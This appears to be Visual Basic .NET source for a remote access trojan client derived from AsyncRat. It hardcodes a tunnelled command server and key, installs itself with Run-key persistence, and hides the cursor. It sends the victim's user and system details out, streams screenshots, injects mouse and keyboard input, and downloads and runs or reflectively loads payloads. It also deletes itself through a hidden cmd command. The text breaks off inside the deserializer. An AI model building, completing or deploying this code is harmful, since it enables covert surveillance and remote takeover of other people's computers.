Imports System.Security.Cryptography
Imports Microsoft.Win32
Imports System.Management
Imports System
Imports System.Net.Sockets
Imports Microsoft.VisualBasic
Imports System.Diagnostics
Imports System.Reflection
Imports System.Runtime.InteropServices
Imports System.Collections.Generic
Imports System.Drawing
Imports System.Windows.Forms
Imports System.IO
Imports System.Net
Imports System.Drawing.Drawing2D
Imports System.Linq
Imports System.Drawing.Imaging
Imports System.Threading
Imports System.Security
Imports System.Text

#Const Release = False
#Const INS = False

#If Release Then
<Assembly: AssemblyTitle("%Title%")>
<Assembly: AssemblyDescription("%Description%")>
<Assembly: AssemblyCompany("%Company%")>
<Assembly: AssemblyProduct("%Product%")>
<Assembly: AssemblyCopyright("%Copyright%")>
<Assembly: AssemblyTrademark("%Trademark%")>
<Assembly: AssemblyFileVersion("%v1%" & "." & "%v2%" & "." & "%v3%" & "." & "%v4%")>
<Assembly: AssemblyVersion("%v1%" & "." & "%v2%" & "." & "%v3%" & "." & "%v4%")>
<Assembly: Guid("%Guid%")>
#End If

'

'


Namespace ClientApp

    Public Class Settings

#If INS Then
        Public Shared ReadOnly ClientFullPath As String = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.%DIR%), "%EXE%")
#End If

#If Release Then
        Public Shared ReadOnly Hosts As New Collections.Generic.List(Of String)({"%HOSTS%"})
        Public Shared ReadOnly Ports As New Collections.Generic.List(Of Integer)({%PORT%})
        Public Shared ReadOnly KEY As String = "%KEY%"
#Else
        Public Shared ReadOnly Hosts As New Collections.Generic.List(Of String)({"jkltq-102-90-117-117.run.pinggy-free.link"})
        Public Shared ReadOnly Ports As New Collections.Generic.List(Of Integer)({38461})
        Public Shared ReadOnly KEY As String = "K9@xR#2mL$vN8pQ&wT4bF!sD5cG7jH*3"
#End If
        Public Shared ReadOnly VER As String = "v1.8"
    End Class


    Public Class Program

        Public Shared isConnected As Boolean = False
        Public Shared IsFrozen As Boolean = False
        Public Shared S As Socket = Nothing
        Public Shared BufferLength As Long = Nothing
        Public Shared BufferLengthReceived As Boolean = False
        Public Shared Buffer() As Byte
        Public Shared MS As MemoryStream = Nothing
        Public Shared Tick As Threading.Timer = Nothing
        Public Shared allDone As New ManualResetEvent(False)

        ' Windows API P/Invoke for mouse control
        <DllImport("user32.dll")> Public Shared Sub mouse_event(ByVal dwFlags As UInteger, ByVal dx As UInteger, ByVal dy As UInteger, ByVal cButtons As UInteger, ByVal dwExtraInfo As IntPtr)
        End Sub

        ' Windows API P/Invoke for keyboard control
        <DllImport("user32.dll")> Public Shared Sub keybd_event(ByVal bVk As Byte, ByVal bScan As Byte, ByVal dwFlags As UInteger, ByVal dwExtraInfo As IntPtr)
        End Sub

        ' Windows API P/Invoke to hide/show cursor
        <DllImport("user32.dll")> Public Shared Function ShowCursor(ByVal bShow As Boolean) As Integer
        End Function

        <DllImport("user32.dll")> Public Shared Function SetCursorPos(ByVal x As Integer, ByVal y As Integer) As Boolean
        End Function

        ' Mouse event constants
        Public Const MOUSEEVENTF_MOVE As UInteger = &H1
        Public Const MOUSEEVENTF_LEFTDOWN As UInteger = &H2
        Public Const MOUSEEVENTF_LEFTUP As UInteger = &H4
        Public Const MOUSEEVENTF_RIGHTDOWN As UInteger = &H8
        Public Const MOUSEEVENTF_RIGHTUP As UInteger = &H10
        Public Const MOUSEEVENTF_MIDDLEDOWN As UInteger = &H20
        Public Const MOUSEEVENTF_MIDDLEUP As UInteger = &H40
        Public Const MOUSEEVENTF_ABSOLUTE As UInteger = &H8000

        ' Keyboard event constants
        Public Const KEYEVENTF_KEYDOWN As UInteger = 0
        Public Const KEYEVENTF_KEYUP As UInteger = &H2

        Public Shared Sub Main()

#If INS Then
            Install()
#End If
            
            ' Hide cursor from user (invisible to remote viewer)
            Try
                Program.ShowCursor(False)
            Catch
            End Try
            
            ' Start connection thread
            Dim ConnectionThread As New Threading.Thread(New Threading.ThreadStart(AddressOf MainLoop))
            ConnectionThread.IsBackground = True
            ConnectionThread.Start()
            
            ' Keep program alive
            While True
                Thread.Sleep(1000)
            End While
        End Sub

        Public Shared Sub MainLoop()

            Debug.WriteLine("[CLIENT] Starting MainLoop - will attempt connection every 2.5 seconds")

            While True
                Thread.Sleep(2.5 * 1000)
                If isConnected = False Then
                    Debug.WriteLine("[CLIENT] Attempting to connect to " + Settings.Hosts.Item(0) + ":" + Settings.Ports.Item(0).ToString)
                    isDisconnected()
                    Connect()
                End If
                allDone.WaitOne()
            End While

        End Sub

#If INS Then
        Public Shared Sub Install()
            Thread.Sleep(2 * 1000)
            Try
                If Process.GetCurrentProcess.MainModule.FileName <> Settings.ClientFullPath Then
                    For Each P As Process In Process.GetProcesses
                        Try
                            If P.MainModule.FileName = Settings.ClientFullPath Then
                                P.Kill()
                            End If
                        Catch : End Try
                    Next
                    Using Drop As New FileStream(Settings.ClientFullPath, FileMode.Create)
                        Dim Client As Byte() = File.ReadAllBytes(Process.GetCurrentProcess.MainModule.FileName)
                        Drop.Write(Client, 0, Client.Length)
                    End Using
                    Thread.Sleep(2 * 1000)
                    Registry.CurrentUser.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Run\").SetValue(Path.GetFileName(Settings.ClientFullPath), Settings.ClientFullPath)
                    Process.Start(Settings.ClientFullPath)
                    Environment.Exit(0)
                End If
            Catch ex As Exception
                Debug.WriteLine("Install : Failed : " + ex.Message)
            End Try
        End Sub
#End If

        Public Shared Sub Connect()

            Try
                Dim logMsg As String = "[CLIENT] Creating socket..."
                Console.WriteLine(logMsg)
                Debug.WriteLine(logMsg)
                LogToFile(logMsg)
                
                S = New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)

                BufferLength = 0
                Buffer = New Byte(49999) {}  ' Initialize to proper 50KB size to receive protocol headers
                MS = New MemoryStream

                S.ReceiveBufferSize = 50 * 1000
                S.SendBufferSize = 50 * 1000

                Dim targetHost As String = Settings.Hosts.Item(New Random().Next(0, Settings.Hosts.Count))
                Dim targetPort As Integer = Settings.Ports.Item(New Random().Next(0, Settings.Ports.Count))
                
                logMsg = "[CLIENT] Resolving hostname: " + targetHost
                Debug.WriteLine(logMsg)
                LogToFile(logMsg)
                
                Dim addresses As System.Net.IPAddress() = Nothing
                Try
                    ' Add a timeout to DNS resolution
                    Dim dnsTask = System.Net.Dns.GetHostAddressesAsync(targetHost)
                    If Not dnsTask.Wait(TimeSpan.FromSeconds(10)) Then
                        Throw New Exception("DNS resolution timeout after 10 seconds")
                    End If
                    addresses = dnsTask.Result
                Catch dnsEx As Exception
                    logMsg = "[CLIENT] DNS resolution failed: " + dnsEx.Message
                    LogToFile(logMsg)
                    Throw New Exception("Failed to resolve " + targetHost + ": " + dnsEx.Message)
                End Try
                
                If addresses.Length = 0 Then
                    Throw New Exception("Hostname '" + targetHost + "' resolved to 0 addresses")
                End If
                
                logMsg = "[CLIENT] DNS returned " + addresses.Length.ToString + " address(es)"
                LogToFile(logMsg)
                For i = 0 To addresses.Length - 1
                    LogToFile("  [" + i.ToString + "] " + addresses(i).ToString + " (" + addresses(i).AddressFamily.ToString + ")")
                Next
                
                ' Filter for IPv4 only (exclude IPv6)
                Dim ipv4Addresses = addresses.Where(Function(addr) addr.AddressFamily = AddressFamily.InterNetwork).ToArray()
                If ipv4Addresses.Length = 0 Then
                    logMsg = "[CLIENT] No IPv4 addresses found, using first address anyway"
                    LogToFile(logMsg)
                    ipv4Addresses = addresses
                End If
                
                Dim resolvedIP As String = ipv4Addresses(0).ToString
                logMsg = "[CLIENT] Resolved to: " + resolvedIP
                Debug.WriteLine(logMsg)
                LogToFile(logMsg)
                
                logMsg = "[CLIENT] Connecting to " + resolvedIP + ":" + targetPort.ToString
                Debug.WriteLine(logMsg)
                LogToFile(logMsg)
                
                Try
                    S.Connect(ipv4Addresses(0), targetPort)
                Catch connEx As Exception
                    logMsg = "[CLIENT] Connection failed: " + connEx.Message + " (" + connEx.GetType.Name + ")"
                    LogToFile(logMsg)
                    Throw
                End Try
                
                logMsg = "[CLIENT] Connected successfully! Local endpoint: " + S.LocalEndPoint.ToString
                Debug.WriteLine(logMsg)
                LogToFile(logMsg)

                isConnected = True

                GatherSystemInfo()

                logMsg = "[CLIENT] Starting async receive with buffer size: " + Buffer.Length.ToString
                Debug.WriteLine(logMsg)
                LogToFile(logMsg)
                
                S.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, New AsyncCallback(AddressOf ListenForCommands), Nothing)

                Dim T As New TimerCallback(AddressOf Ping)
                Tick = New Threading.Timer(T, Nothing, 15000, 30000)
            Catch ex As Exception
                Dim logMsg As String = "[CLIENT] Connect FAILED: " + ex.Message + " (" + ex.GetType.Name + ")"
                If ex.InnerException IsNot Nothing Then
                    logMsg += " -> Inner: " + ex.InnerException.Message
                End If
                Debug.WriteLine(logMsg)
                LogToFile(logMsg)
                isConnected = False
            Finally
                allDone.Set()
            End Try
        End Sub

        Private Shared Sub LogToFile(msg As String)
            Try
                Dim logPath = System.IO.Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "client_debug.log")
                Dim timestamp = DateTime.Now.ToString("HH:mm:ss.fff")
                Dim logLine = timestamp + " " + msg + vbCrLf
                System.IO.File.AppendAllText(logPath, logLine, System.Text.Encoding.UTF8)
            Catch logEx As Exception
                ' Silently fail if logging doesn't work
                Debug.WriteLine("Failed to write log: " + logEx.Message)
            End Try
        End Sub

        Private Shared Sub GatherSystemInfo()
            Dim OS As New Devices.ComputerInfo
            Dim FriendlyName As String = OS.OSFullName.Replace("Microsoft", Nothing) + " " + Environment.Is64BitOperatingSystem.ToString.Replace("False", "32bit").Replace("True", "64bit") + " " + Environment.OSVersion.ServicePack.Replace("Service Pack", "SP")
            Send(CByte(PacketHeader.identification), GetHash(ID), Environment.UserName, FriendlyName, Settings.VER)
        End Sub

        Public Shared Sub ListenForCommands(ByVal ar As IAsyncResult)
            If isConnected = False OrElse Not S.Connected Then
                LogToFile("[RECV] Disconnected (isConnected=" + isConnected.ToString + ", S.Connected=" + S.Connected.ToString + ")")
                isConnected = False
                Exit Sub
            End If
            Try
                Dim Received As Integer = S.EndReceive(ar)
                LogToFile("[RECV] Received " + Received.ToString + " bytes, BufferLengthReceived=" + BufferLengthReceived.ToString)
                
                If Received > 0 Then
                    If BufferLengthReceived = False Then
                        ' First message - should contain length header
                        MS.Write(Buffer, 0, Received)
                        
                        ' Try to parse the length from the data we received
                        Dim ReceivedData As Byte() = MS.ToArray
                        Dim NullIndex = Array.IndexOf(ReceivedData, CByte(0))
                        
                        If NullIndex > 0 Then
                            ' Found null terminator, extract length string
                            Dim LengthBytes As Byte() = New Byte(NullIndex - 1) {}
                            Array.Copy(ReceivedData, 0, LengthBytes, 0, NullIndex)
                            Try
                                Dim LengthStr As String = Text.Encoding.UTF8.GetString(LengthBytes)
                                If Long.TryParse(LengthStr, BufferLength) Then
                                    LogToFile("[RECV] Parsed length: " + BufferLength.ToString)
                                    MS.Dispose()
                                    MS = New MemoryStream
                                    If Received > NullIndex + 1 Then
                                        ' There's encrypted data after the length header
                                        MS.Write(ReceivedData, NullIndex + 1, Received - NullIndex - 1)
                                    End If
                                    BufferLengthReceived = True
                                    
                                    ' CHECK IMMEDIATELY if message is complete
                                    If MS.Length >= BufferLength Then
                                        LogToFile("[RECV] Complete message in first packet: " + MS.Length.ToString + " bytes")
                                        ThreadPool.QueueUserWorkItem(New WaitCallback(AddressOf Messages.Read), MS.ToArray)
                                        MS.Dispose()
                                        MS = New MemoryStream
                                        Buffer = New Byte(49999) {}
                                        BufferLength = 0
                                        BufferLengthReceived = False
                                    Else
                                        Buffer = New Byte(BufferLength - MS.Length) {}
                                    End If
                                End If
                            Catch ex As Exception
                                LogToFile("[RECV] Error parsing length: " + ex.Message)
                            End Try
                        End If
                    Else
                        ' Receiving continuation data
                        MS.Write(Buffer, 0, Received)
                        LogToFile("[RECV] Data fragment: MS.Length now " + MS.Length.ToString + ", need " + BufferLength.ToString)
                        
                        If (MS.Length >= BufferLength) Then
                            LogToFile("[RECV] Complete message received: " + MS.Length.ToString + " bytes")
                            ThreadPool.QueueUserWorkItem(New WaitCallback(AddressOf Messages.Read), MS.ToArray)
                            MS.Dispose()
                            MS = New MemoryStream
                            Buffer = New Byte(49999) {}
                            BufferLength = 0
                            BufferLengthReceived = False
                        Else
                            Buffer = New Byte(BufferLength - MS.Length) {}
                        End If
                    End If
                Else
                    LogToFile("[RECV] Connection closed (Received=0)")
                    isConnected = False
                    Exit Sub
                End If
                S.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, New AsyncCallback(AddressOf ListenForCommands), Nothing)
            Catch ex As Exception
                LogToFile("[RECV] Exception: " + ex.Message + " (" + ex.GetType.Name + ")")
                isConnected = False
                Exit Sub
            End Try
        End Sub

        Public Shared Sub Send(ParamArray Msgs As Object())
            If isConnected = True OrElse S.Connected Then
                Try
                    Dim Packer As New Pack
                    Dim Data As Byte() = Packer.Serialize(Msgs)

                    Using MS As New MemoryStream
                        Dim Buffer As Byte() = AES_Encryptor(Data)
                        Dim BufferLength As Byte() = SB(Buffer.Length & CChar(vbNullChar))

                        MS.Write(BufferLength, 0, BufferLength.Length)
                        MS.Write(Buffer, 0, Buffer.Length)

                        S.Poll(-1, SelectMode.SelectWrite)
                        S.BeginSend(MS.ToArray, 0, MS.Length, SocketFlags.None, New AsyncCallback(AddressOf EndSend), Nothing)
                    End Using
                Catch ex As Exception
                    Debug.WriteLine("Send : Failed")
                    isConnected = False
                End Try
            Else
                isConnected = False
            End If
        End Sub

        Public Shared Sub EndSend(ByVal ar As IAsyncResult)
            Try
                S.EndSend(ar)
            Catch ex As Exception
                Debug.WriteLine("EndSend : Failed")
                isConnected = False
            End Try
        End Sub

        Public Shared Sub isDisconnected()

            If Tick IsNot Nothing Then
                Try
                    Tick.Dispose()
                    Tick = Nothing
                Catch ex As Exception
                    Debug.WriteLine("Tick.Dispose")
                End Try
            End If

            If MS IsNot Nothing Then
                Try
                    MS.Close()
                    MS.Dispose()
                    MS = Nothing
                Catch ex As Exception
                    Debug.WriteLine("MS.Dispose")
                End Try
            End If

            If S IsNot Nothing Then
                Try
                    S.Close()
                    S.Dispose()
                    S = Nothing
                Catch ex As Exception
                    Debug.WriteLine("S.Dispose")
                End Try
            End If


        End Sub

        Public Shared Sub Ping()
            Try
                If isConnected = True Then
                    Send(CByte(PacketHeader.Ping))
                    Debug.WriteLine("Pinged!")
                End If
            Catch ex As Exception
            End Try
        End Sub

        ' Handle mouse input from Server
        Public Shared Sub HandleMouseInput(ByVal X As Integer, ByVal Y As Integer, ByVal Button As Integer)
            If IsFrozen Then
                Debug.WriteLine("HandleMouseInput blocked: Input frozen")
                Return
            End If
            
            Try
                Debug.WriteLine("HandleMouseInput called: X=" + X.ToString + " Y=" + Y.ToString + " Button=" + Button.ToString)
                
                ' Get screen dimensions for coordinate normalization
                Dim ScreenWidth As Integer = Screen.PrimaryScreen.Bounds.Width
                Dim ScreenHeight As Integer = Screen.PrimaryScreen.Bounds.Height
                
                Debug.WriteLine("HandleMouseInput: ScreenWidth=" + ScreenWidth.ToString + " ScreenHeight=" + ScreenHeight.ToString)
                
                ' Normalize coordinates from pixel to absolute (0-65535 range)
                ' No inversion needed - both use top-left as (0,0)
                Dim NormalizedX As UInteger = CUInt((CLng(X) * 65535) / ScreenWidth)
                Dim NormalizedY As UInteger = CUInt((CLng(Y) * 65535) / ScreenHeight)
                
                ' Clamp to valid range
                NormalizedX = Math.Min(NormalizedX, 65535)
                NormalizedY = Math.Min(NormalizedY, 65535)
                
                Debug.WriteLine("HandleMouseInput: NormX=" + NormalizedX.ToString + " NormY=" + NormalizedY.ToString)
                
                Select Case Button
                    Case 1 ' Left click
                        Debug.WriteLine("HandleMouseInput: Sending left click")
                        Program.mouse_event(Program.MOUSEEVENTF_LEFTDOWN Or Program.MOUSEEVENTF_ABSOLUTE, NormalizedX, NormalizedY, 0, IntPtr.Zero)
                        Thread.Sleep(50)
                        Program.mouse_event(Program.MOUSEEVENTF_LEFTUP Or Program.MOUSEEVENTF_ABSOLUTE, NormalizedX, NormalizedY, 0, IntPtr.Zero)
                    Case 2 ' Right click
                        Debug.WriteLine("HandleMouseInput: Sending right click")
                        Program.mouse_event(Program.MOUSEEVENTF_RIGHTDOWN Or Program.MOUSEEVENTF_ABSOLUTE, NormalizedX, NormalizedY, 0, IntPtr.Zero)
                        Thread.Sleep(50)
                        Program.mouse_event(Program.MOUSEEVENTF_RIGHTUP Or Program.MOUSEEVENTF_ABSOLUTE, NormalizedX, NormalizedY, 0, IntPtr.Zero)
                    Case 3 ' Middle click
                        Debug.WriteLine("HandleMouseInput: Sending middle click")
                        Program.mouse_event(Program.MOUSEEVENTF_MIDDLEDOWN Or Program.MOUSEEVENTF_ABSOLUTE, NormalizedX, NormalizedY, 0, IntPtr.Zero)
                        Thread.Sleep(50)
                        Program.mouse_event(Program.MOUSEEVENTF_MIDDLEUP Or Program.MOUSEEVENTF_ABSOLUTE, NormalizedX, NormalizedY, 0, IntPtr.Zero)
                    Case 0 ' Move mouse
                        Debug.WriteLine("HandleMouseInput: Sending mouse move")
                        Program.mouse_event(Program.MOUSEEVENTF_MOVE Or Program.MOUSEEVENTF_ABSOLUTE, NormalizedX, NormalizedY, 0, IntPtr.Zero)
                End Select
                
                ' Hide cursor by moving to (0,0) - makes remote input invisible
                Program.SetCursorPos(0, 0)
            Catch ex As Exception
                Debug.WriteLine("HandleMouseInput error: " + ex.Message)
            End Try
        End Sub

        ' Handle keyboard input from Server
        Public Shared Sub HandleKeyboardInput(ByVal KeyCode As Byte, ByVal IsDown As Boolean)
            If IsFrozen Then
                Debug.WriteLine("HandleKeyboardInput blocked: Input frozen")
                Return
            End If
            
            Try
                If IsDown Then
                    Program.keybd_event(KeyCode, 0, Program.KEYEVENTF_KEYDOWN, IntPtr.Zero)
                Else
                    Program.keybd_event(KeyCode, 0, Program.KEYEVENTF_KEYUP, IntPtr.Zero)
                End If
            Catch ex As Exception
                Debug.WriteLine("HandleKeyboardInput: " + ex.Message)
            End Try
        End Sub
    End Class

    Public Class Messages
        Public Shared Sub Read(ByVal Data As Byte())
            Try

                Dim Packer As New Pack
                Dim itm As Object() = Packer.Deserialize(AES_Decryptor(Data))

                Debug.WriteLine("Messages.Read: Received packet type " + itm(0).ToString + " with " + itm.Length.ToString + " items")

                Select Case itm(0)
                    Case PacketHeader.ClientShutdown
                        Try
                            Program.S.Shutdown(SocketShutdown.Both)
                            Program.S.Close()
                        Catch ex As Exception
                        End Try
                        Environment.Exit(0)

                    Case PacketHeader.ClientDelete
                        AntiForensics()

                    Case PacketHeader.ClientUpdate
                        Program.Send(CByte(PacketHeader.MsgReceived))
                        Download(itm(1), itm(2), itm(3))

                    Case PacketHeader.RemoteDesktopOpen
                        Program.Send(CByte(PacketHeader.RemoteDesktopOpen))

                    Case PacketHeader.RemoteDesktopSend
                        Surveillance(itm(1), itm(2))

                    Case PacketHeader.Reflection
                        Program.Send(CByte(PacketHeader.MsgReceived))
                        Reflection(itm(1))

                    Case PacketHeader.MouseInput
                        Debug.WriteLine("Messages.Read: MouseInput case - itm.Length=" + itm.Length.ToString)
                        If itm.Length >= 4 Then
                            Dim X As Integer = CInt(itm(1))
                            Dim Y As Integer = CInt(itm(2))
                            Dim Button As Integer = CInt(itm(3))
                            Debug.WriteLine("Messages.Read: Calling HandleMouseInput with X=" + X.ToString + " Y=" + Y.ToString + " Button=" + Button.ToString)
                            Program.HandleMouseInput(X, Y, Button)
                        Else
                            Program.Send(CByte(PacketHeader.ErrorMassages), "Invalid MouseInput packet")
                        End If

                    Case PacketHeader.KeyboardInput
                        Debug.WriteLine("Messages.Read: KeyboardInput case - itm.Length=" + itm.Length.ToString)
                        If itm.Length >= 3 Then
                            Dim KeyCode As Byte = CByte(itm(1))
                            Dim IsDown As Boolean = CBool(itm(2))
                            Debug.WriteLine("Messages.Read: Calling HandleKeyboardInput with KeyCode=" + KeyCode.ToString + " IsDown=" + IsDown.ToString)
                            Program.HandleKeyboardInput(KeyCode, IsDown)
                        Else
                            Program.Send(CByte(PacketHeader.ErrorMassages), "Invalid KeyboardInput packet")
                        End If

                    Case PacketHeader.FreezeInput
                        Try
                            If itm.Length >= 2 Then
                                Program.IsFrozen = CBool(itm(1))
                                Debug.WriteLine("FreezeInput: " + Program.IsFrozen.ToString)
                            End If
                        Catch
                            Program.Send(CByte(PacketHeader.ErrorMassages), "Invalid FreezeInput packet")
                        End Try

                End Select

            Catch ex As Exception
                Program.Send(CByte(PacketHeader.ErrorMassages), ex.Message)
            End Try
        End Sub

        'Private Shared Function AsyncRatPlugin(ByVal Library As Byte())
        '    Dim Plugin As Assembly = Assembly.Load(AES_Decryptor(Library))
        '    Dim CallType = Plugin.CreateInstance("Plugin.Plugin", True)
        'End Function

        Private Shared Sub Download(ByVal Name As String, ByVal Buffer As Byte(), ByRef Update As Boolean)
            Try
                Dim Temp As String = Path.GetTempFileName + Name
                File.WriteAllBytes(Temp, AES_Decryptor(Buffer))
                Thread.Sleep(500)
                Process.Start(Temp)
                If Update Then
                    AntiForensics()
                End If
            Catch ex As Exception
                Program.Send(CByte(PacketHeader.ErrorMassages), ex.Message)
            End Try
        End Sub

        Private Shared Sub AntiForensics()
            Try
                Dim Del As New ProcessStartInfo With {
                    .Arguments = "/C choice /C Y /N /D Y /T 1 & Del " + Process.GetCurrentProcess.MainModule.FileName,
                    .WindowStyle = ProcessWindowStyle.Hidden,
                    .CreateNoWindow = True,
                    .FileName = "cmd.exe"
                    }

                Try
                    Program.S.Shutdown(SocketShutdown.Both)
                    Program.S.Close()
                Catch ex As Exception
                End Try

                Process.Start(Del)
                Environment.Exit(0)
            Catch ex As Exception
                Program.Send(CByte(PacketHeader.ErrorMassages), ex.Message)
            End Try
        End Sub

        Private Delegate Function ExecuteAssembly(ByVal sender As Object, ByVal parameters As Object()) As Object
        Private Shared Sub Reflection(ByVal buffer As Byte()) 'gigajew@hf
            Try
                Dim parameters As Object() = Nothing
                Dim assembly As Assembly = Thread.GetDomain().Load(AES_Decryptor(buffer))
                Dim entrypoint As MethodInfo = assembly.EntryPoint
                If entrypoint.GetParameters().Length > 0 Then
                    parameters = New Object() {New String() {Nothing}}
                End If

                Dim assemblyExecuteThread As Thread = New Thread(Sub()
                                                                     Thread.BeginThreadAffinity()
                                                                     Thread.BeginCriticalRegion()
                                                                     Dim executeAssembly As ExecuteAssembly = New ExecuteAssembly(AddressOf entrypoint.Invoke)
                                                                     executeAssembly(Nothing, parameters)
                                                                     Thread.EndCriticalRegion()
                                                                     Thread.EndThreadAffinity()
                                                                 End Sub)
                If parameters IsNot Nothing Then
                    If parameters.Length > 0 Then
                        assemblyExecuteThread.SetApartmentState(ApartmentState.STA)
                    Else
                        assemblyExecuteThread.SetApartmentState(ApartmentState.MTA)
                    End If
                End If

                assemblyExecuteThread.Start()
            Catch ex As Exception
                Program.Send(CByte(PacketHeader.ErrorMassages), ex.Message)
            End Try
        End Sub

        Public Shared Sync As Object = New Object
        Public Shared Sub Surveillance(ByVal W As Integer, ByVal H As Integer)
            SyncLock Sync

                Try
                    'Surveillance
                    Dim ScreenSize As New Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height)
                    Dim ImageScreenSize As Graphics = Graphics.FromImage(ScreenSize)
                    ImageScreenSize.CompositingQuality = CompositingQuality.HighSpeed
                    ImageScreenSize.CopyFromScreen(0, 0, 0, 0, New Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height), CopyPixelOperation.SourceCopy)

                    'Resize
                    Dim Resize As New Bitmap(W, H)
                    Dim ImageResize As Graphics = Graphics.FromImage(Resize)
                    ImageResize.CompositingQuality = CompositingQuality.HighSpeed
                    ImageResize.DrawImage(ScreenSize, New Rectangle(0, 0, W, H), New Rectangle(0, 0, Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height), GraphicsUnit.Pixel)

                    'compress
                    Dim encoderParameter As EncoderParameter = New EncoderParameter(Imaging.Encoder.Quality, 50)
                    Dim encoderInfo As ImageCodecInfo = GetEncoderInfo(ImageFormat.Jpeg)
                    Dim encoderParameters As EncoderParameters = New EncoderParameters(1)
                    encoderParameters.Param(0) = encoderParameter

                    Dim MS As New MemoryStream
                    Resize.Save(MS, encoderInfo, encoderParameters)

                    Program.Send(CByte(PacketHeader.RemoteDesktopSend), MS.GetBuffer)

                    Try
                        MS.Dispose()
                        ImageScreenSize.Dispose()
                        ImageResize.Dispose()
                        Resize.Dispose()
                        ScreenSize.Dispose()
                    Catch ex As Exception
                        Debug.WriteLine("Surveillance.Dispose" + ex.Message)
                    End Try

                Catch ex As Exception
                    Debug.WriteLine("Surveillance" + ex.Message)
                End Try
            End SyncLock

        End Sub

        Private Shared Function GetEncoderInfo(ByVal format As ImageFormat) As ImageCodecInfo
            Try
                Dim j As Integer
                Dim encoders() As ImageCodecInfo
                encoders = ImageCodecInfo.GetImageEncoders()

                j = 0
                While j < encoders.Length
                    If encoders(j).FormatID = format.Guid Then
                        Return encoders(j)
                    End If
                    j += 1
                End While
                Return Nothing
            Catch ex As Exception
                Return Nothing
            End Try
        End Function

    End Class

    Module Helper
        Function SB(ByVal s As String) As Byte()
            Return Encoding.UTF8.GetBytes(s)
        End Function

        Function BS(ByVal b As Byte()) As String
            Return Encoding.UTF8.GetString(b)
        End Function

        Function ID() As String
            Dim S As String = Nothing
            S += Environment.UserDomainName
            S += Environment.UserName
            S += Environment.MachineName
            Return S
        End Function

        Function GetHash(strToHash As String) As String
            Dim md5Obj As New MD5CryptoServiceProvider
            Dim bytesToHash() As Byte = Encoding.ASCII.GetBytes(strToHash)
            bytesToHash = md5Obj.ComputeHash(bytesToHash)
            Dim strResult As New StringBuilder
            For Each b As Byte In bytesToHash
                strResult.Append(b.ToString("x2"))
            Next
            Return strResult.ToString.Substring(0, 12).ToUpper
        End Function

        Function AES_Encryptor(ByVal input As Byte()) As Byte()
            Dim AES As New RijndaelManaged
            Dim Hash As New MD5CryptoServiceProvider
            Dim ciphertext As String = ""
            Try
                AES.Key = Hash.ComputeHash(SB(Settings.KEY))
                AES.Mode = CipherMode.ECB
                Dim DESEncrypter As ICryptoTransform = AES.CreateEncryptor
                Dim Buffer As Byte() = input
                Return DESEncrypter.TransformFinalBlock(Buffer, 0, Buffer.Length)
            Catch ex As Exception
                Return Nothing
            End Try
        End Function

        Function AES_Decryptor(ByVal input As Byte()) As Byte()
            Dim AES As New RijndaelManaged
            Dim Hash As New MD5CryptoServiceProvider
            Try
                AES.Key = Hash.ComputeHash(SB(Settings.KEY))
                AES.Mode = CipherMode.ECB
                Dim DESDecrypter As ICryptoTransform = AES.CreateDecryptor
                Dim Buffer As Byte() = input
                Return DESDecrypter.TransformFinalBlock(Buffer, 0, Buffer.Length)
            Catch ex As Exception
                Return Nothing
            End Try
        End Function
    End Module



    Enum PacketHeader
        identification = 0
        RemoteDesktopOpen = 1
        RemoteDesktopSend = 2
        ErrorMassages = 3
        ClientShutdown = 4
        ClientDelete = 5
        ClientUpdate = 6
        Reflection = 7
        MsgReceived = 8
        Ping = 9
        MouseInput = 10
        KeyboardInput = 11
        FreezeInput = 12
    End Enum


    NotInheritable Class Pack

        Private Table As Dictionary(Of Type, Byte)
        Public Sub New()
            Table = New Dictionary(Of Type, Byte)()

            Table.Add(GetType(Boolean), 0)
            Table.Add(GetType(Byte), 1)
            Table.Add(GetType(Byte()), 2)
            Table.Add(GetType(Char), 3)
            Table.Add(GetType(Char()), 4)
            Table.Add(GetType(Decimal), 5)
            Table.Add(GetType(Double), 6)
            Table.Add(GetType(Integer), 7)
            Table.Add(GetType(Long), 8)
            Table.Add(GetType(SByte), 9)
            Table.Add(GetType(Short), 10)
            Table.Add(GetType(Single), 11)
            Table.Add(GetType(String), 12)
            Table.Add(GetType(UInteger), 13)
            Table.Add(GetType(ULong), 14)
            Table.Add(GetType(UShort), 15)
            Table.Add(GetType(DateTime), 16)
        End Sub

        Public Function Serialize(ParamArray data As Object()) As Byte()
            Dim Stream As New MemoryStream()
            Dim Writer As New BinaryWriter(Stream, Encoding.UTF8)
            Dim Current As Byte = 0

            Writer.Write(Convert.ToByte(data.Length))

            For I As Integer = 0 To data.Length - 1
                Current = Table(data(I).GetType())
                Writer.Write(Current)

                Select Case Current
                    Case 0
                        Writer.Write(DirectCast(data(I), Boolean))
                    Case 1
                        Writer.Write(DirectCast(data(I), Byte))
                    Case 2
                        Writer.Write(DirectCast(data(I), Byte()).Length)
                        Writer.Write(DirectCast(data(I), Byte()))
                    Case 3
                        Writer.Write(DirectCast(data(I), Char))
                    Case 4
                        Writer.Write(DirectCast(data(I), Char()).ToString())
                    Case 5
                        Writer.Write(DirectCast(data(I), Decimal))
                    Case 6
                        Writer.Write(DirectCast(data(I), Double))
                    Case 7
                        Writer.Write(DirectCast(data(I), Integer))
                    Case 8
                        Writer.Write(DirectCast(data(I), Long))
                    Case 9
                        Writer.Write(DirectCast(data(I), SByte))
                    Case 10
                        Writer.Write(DirectCast(data(I), Short))
                    Case 11
                        Writer.Write(DirectCast(data(I), Single))
                    Case 12
                        Writer.Write(DirectCast(data(I), String))
                    Case 13
                        Writer.Write(DirectCast(data(I), UInteger))
                    Case 14
                        Writer.Write(DirectCast(data(I), ULong))
                    Case 15
                        Writer.Write(DirectCast(data(I), UShort))
                    Case 16
                        Writer.Write(DirectCast(data(I), Date).ToBinary())
                End Select
            Next

            Writer.Close()
            Return Stream.ToArray()
        End Function

        Public Function Deserialize(data As Byte()) As Object()
            Dim Stream As New MemoryStream(data)
            Dim Reader As New BinaryReader(Stream, Encoding.UTF8)
            Dim Items As New List(Of Object)()
